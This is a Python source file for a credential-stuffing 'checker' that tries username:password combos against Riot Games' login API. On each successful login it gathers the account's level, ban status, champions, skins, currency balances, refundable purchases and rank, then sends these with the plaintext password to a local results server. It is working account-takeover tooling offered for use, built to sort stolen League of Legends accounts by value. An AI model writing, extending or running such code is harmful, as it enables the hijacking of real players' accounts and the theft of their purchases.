from common.gameData import GameData
from common.region import Region
from common.crackMode import CrackMode
from common.crackResult import CrackResult
from common.proxy import Proxy
from common.combo import Combo
from config import config

import requests
import re
import time

import json


class Checker:
    def __init__(
        self,
        region: Region,
        combo: Combo,
        game_data: GameData,
        mode: CrackMode = CrackMode.CHECK,
        min_level=30,
        capture_bans=False,
        proxy: Proxy = None,
    ):
        self.region = region
        self.combo = combo
        self.game_data = game_data
        self.mode = mode
        self.min_level = min_level
        self.capture_bans = capture_bans
        self.proxy = proxy

    def log(self, msg: str):
        print(f"[{self.combo.username}:{self.combo.password}] - {msg}")

    def getQueueData(self, queue):
        return {
            "rank": f"{queue['tier']} {queue['rank']}",
            "lp": queue["leaguePoints"],
            "wins": queue["wins"],
            "losses": queue["losses"],
        }

    def check(self) -> CrackResult:
        try:
            region = self.region.value
            self.log(f"Checking...")

            payload = {
                "acr_values": "urn:riot:bronze",
                "claims": "",
                "client_id": "riot-client",
                "nonce": 1,
                "redirect_uri": "http://localhost/redirect",
                "response_type": "token id_token",
                "scope": "openid link ban lol_region email summoner profile lol",
            }

            response = requests.post(
                "https://auth.riotgames.com/api/v1/authorization",
                json=payload,
            )

            if response.status_code == 200:
                payload = {
                    "type": "auth",
                    "username": self.combo.username,
                    "password": self.combo.password,
                    "remember": False,
                    "language": "en_GB",
                    "region": region["login"],
                }
                response = requests.put(
                    "https://auth.riotgames.com/api/v1/authorization",
                    json=payload,
                    cookies=response.cookies,
                )
                result = response.json()
                if "error" in result:
                    error = result["error"]
                    if error == "auth_failure" or error == "consent_required":
                        return CrackResult.FAILED
                    if error == "archived_account":
                        return CrackResult.ARCHIVED
                    if error == "rate_limited" or error == "invalid_session_id":
                        return CrackResult.RETRY
                    else:
                        self.log(f"UNKNOWN LOGIN ERROR TYPE: {error}")
                else:
                    # successful login
                    if self.mode == CrackMode.CRACK:
                        return CrackResult.SUCCESS
                    if (
                        "response" in result
                        and "parameters" in result["response"]
                        and "uri" in result["response"]["parameters"]
                    ):
                        uri = result["response"]["parameters"]["uri"]
                        match = re.search("#access_token=(.*?)&", uri)
                        token = match.group(1)

                        # get user_info
                        response = requests.post(
                            "https://auth.riotgames.com/userinfo",
                            headers={"Authorization": f"Bearer {token}"},
                        )
                        user_info = response.json()
                        if (
                            "lol_account" not in user_info
                            or user_info["lol_account"] == None
                            or "lol" not in user_info
                            or user_info["lol"] == None
                        ):
                            return CrackResult.NOT_CREATED
                        if (
                            int(user_info["lol_account"]["summoner_level"])
                            < self.min_level
                        ):
                            return CrackResult.UNDER_LEVEL
                        banned = False
                        toxic_banned = False
                        ban_code = user_info["ban"]["code"]
                        ban_expires = user_info["ban"]["exp"]
                        if ban_code != None and ban_code != "LEAVING":
                            if (
                                "CHAT_TOXICITY" in ban_code
                                or "INTENTIONAL_FEEDING" in ban_code
                            ):
                                toxic_banned = True
                            elif ban_expires != None and int(ban_expires) > round(
                                time.time() * 1000
                            ):
                                banned = True
                                if not self.capture_bans:
                                    return CrackResult.BANNED

                        # get inventory (champs, skins)
                        account_id = user_info["lol"]["cuid"]
                        response = requests.get(
                            f"https://{region['login']}.cap.riotgames.com/lolinventoryservice/v2/inventories/simple?puuid={user_info['sub']}&inventoryTypes=CHAMPION&inventoryTypes=CHAMPION_SKIN&location={region['location']}&accountId={account_id}&signed=true",
                            headers={"Authorization": f"Bearer {token}"},
                        )
                        inventory = response.json()
                        champions = inventory["data"]["items"]["CHAMPION"]
                        skins = inventory["data"]["items"]["CHAMPION_SKIN"]
                        owned_champions = list(
                            map(
                                lambda x: x["id"],
                                filter(
                                    lambda x: int(x["key"]) in champions,
                                    self.game_data.champions,
                                ),
                            )
                        )
                        owned_skins = list(
                            map(
                                lambda x: x["name"],
                                filter(
                                    lambda x: int(x["id"]) in skins,
                                    self.game_data.skins,
                                ),
                            )
                        )

                        # get store info (refundable rp, be)
                        response = requests.get(
                            f"https://{region['store']}.store.leagueoflegends.com/storefront/v3/history/purchase?language=en_GB",
                            headers={"Authorization": f"Bearer {token}"},
                        )
                        store = response.json()
                        transactions = store["transactions"]
                        refundable_rp = sum(
                            map(
                                lambda x: x["amountSpent"],
                                filter(
                                    lambda x: x["refundable"] == True
                                    and x["currencyType"] == "RP",
                                    transactions,
                                ),
                            )
                        )
                        refundable_be = sum(
                            map(
                                lambda x: x["amountSpent"],
                                filter(
                                    lambda x: x["refundable"] == True
                                    and x["currencyType"] == "IP",
                                    transactions,
                                ),
                            )
                        )

                        # get rank info
                        response = requests.get(
                            f"https://{region['ledge']}.ledge.leagueoflegends.com/leagues-ledge/v2/signedRankedStats",
                            headers={"Authorization": f"Bearer {token}"},
                        )
                        result = response.json()
                        queues = result["queues"]
                        solo_queue = next(
                            filter(
                                lambda x: x["queueType"] == "RANKED_SOLO_5x5", queues
                            )
                        )
                        flex_queue = next(
                            filter(lambda x: x["queueType"] == "RANKED_FLEX_SR", queues)
                        )
                        tft_queue = next(
                            filter(lambda x: x["queueType"] == "RANKED_TFT", queues)
                        )
                        tft_turbo_queue = next(
                            filter(
                                lambda x: x["queueType"] == "RANKED_TFT_TURBO", queues
                            )
                        )

                        # get match history
                        response = requests.get(
                            "https://acs.leagueoflegends.com/v1/stats/player_history/auth?begIndex=0&endIndex=1",
                            headers={"Authorization": f"Bearer {token}"},
                        )
                        result = response.json()
                        last_played = 0
                        if (
                            "games" in result
                            and "games" in result["games"]
                            and len(result["games"]["games"]) > 0
                        ):
                            game = result["games"]["games"][0]
                            last_played = game["gameCreation"]
                        else:
                            if response.status_code != 404:
                                return CrackResult.RETRY

                        # everything successful
                        summoner = {
                            "id": user_info["lol_account"]["summoner_id"],
                            "region": region["store"],
                            "username": self.combo.username,
                            "password": self.combo.password,
                            "email_verified": user_info["email_verified"],
                            "phone_verified": user_info["phone_number_verified"],
                            "summoner_name": user_info["lol_account"]["summoner_name"],
                            "level": user_info["lol_account"]["summoner_level"],
                            "last_played": last_played,
                            "solo_queue": self.getQueueData(solo_queue),
                            "flex_queue": self.getQueueData(flex_queue),
                            "riot_points": store["player"]["rp"],
                            "blue_essence": store["player"]["ip"],
                            "refund_credits": store["refundCreditsRemaining"],
                            "refundable_rp": refundable_rp,
                            "refundable_be": refundable_be,
                            "champions": owned_champions,
                            "skins": owned_skins,
                            "banned": banned,
                            "toxic_banned": toxic_banned,
                        }
                        payload = {
                            "result": "Success",
                            "summoner": summoner,
                        }
                        uploaded = False
                        while not uploaded:
                            response = requests.post(
                                f"http://localhost:3001/api/jobs/results/{self.combo.id}",
                                headers={
                                    "Authorization": f"Bearer {config['root_token']}"
                                },
                                json=payload,
                            )
                            uploaded = response.status_code == 200
                        return CrackResult.SUCCESS
                    else:
                        return CrackResult.RETRY
            else:
                return CrackResult.RETRY
        except:
            return CrackResult.RETRY
